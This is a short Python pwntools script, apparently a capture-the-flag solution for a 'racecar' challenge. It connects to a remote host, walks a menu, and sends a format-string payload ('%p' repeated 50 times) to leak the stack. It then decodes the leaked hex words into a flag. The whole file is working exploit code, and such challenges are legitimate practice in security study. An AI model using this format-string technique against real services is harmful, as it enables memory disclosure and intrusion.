#!/usr/bin/env python3
from pwn import *
from pwnlib.elf import char


def exploit(payload: str):
	#conn = process('./racecar')
	conn = remote('209.97.134.177', 30985)
	conn.sendlineafter(b'Name', b'a')
	conn.sendlineafter(b'Nickname', b'a')
	conn.sendlineafter(b'selection', b'2')
	conn.sendlineafter(b'car', b'1')
	conn.sendlineafter(b'Circuit', b'2')
	conn.sendlineafter(b'victory?', bytes(payload, encoding='utf-8'))
	conn.recv()
	stack = conn.recv().decode('utf-8')
	print(stack)
	conn.close()

	return stack

def hex_to_char(hex_val, byte_order='little'):
    hex_str = str(hex_val)[2:]  # remove the '0x' prefix from the hex string
    hex_bytes = bytes.fromhex(hex_str)  # convert the hex string to bytes
    int_val = int.from_bytes(hex_bytes, byteorder=byte_order)  # convert bytes to int using specified byte order
    utf32_bytes = int_val.to_bytes(4, byteorder='big')  # convert int to bytes using UTF-32 encoding
    return utf32_bytes.decode('utf-8', errors='ignore')  # decode bytes to corresponding character using UTF-32 encoding



if __name__ == '__main__':
	resp = exploit('%p '*50)
	stack = resp.split(' ')[30:]
	string = ""
	for i in stack:
		if '0x' in i and len(i) > 3:
			string += hex_to_char(i)
	flag = string.replace('\x00', '')
	print(flag)


